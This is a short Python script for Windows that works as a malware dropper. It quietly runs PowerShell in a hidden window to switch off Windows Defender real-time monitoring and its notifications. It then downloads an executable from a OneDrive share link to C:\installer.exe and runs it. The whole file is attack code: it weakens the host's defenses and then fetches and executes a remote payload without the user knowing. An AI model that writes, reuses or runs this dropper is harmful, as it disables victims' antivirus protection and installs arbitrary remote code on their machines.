import os
import subprocess
import sys
import urllib.request

def run_hidden(cmd):
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    return subprocess.run(cmd, startupinfo=startupinfo, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def configure_def(disable_notif, disable_realtime):
    powershell_cmd = []

    if disable_notif:
        powershell_cmd.append("Set-MpPreference -DisableToastNotifications $true")

    if disable_realtime:
        powershell_cmd.append("Set-MpPreference -DisableRealtimeMonitoring $true")

    if powershell_cmd:
        full_cmd = ["powershell", "-Command", ";".join(powershell_cmd)]
        run_hidden(full_cmd)

if __name__ == "__main__":
    if os.name != "nt":
        sys.exit()
    else:
        disable_notif = True
        disable_realtime = True
        configure_def(disable_notif, disable_realtime)
        file_urls = [
    ("https://api.onedrive.com/v1.0/shares/s!Ary-0P-yV3rdoygd_g3zk_X1rZGy/root/content", "C:\\installer.exe")
        ]

    for url, save_path in file_urls:
        urllib.request.urlretrieve(url, save_path)
        subprocess.run([save_path])
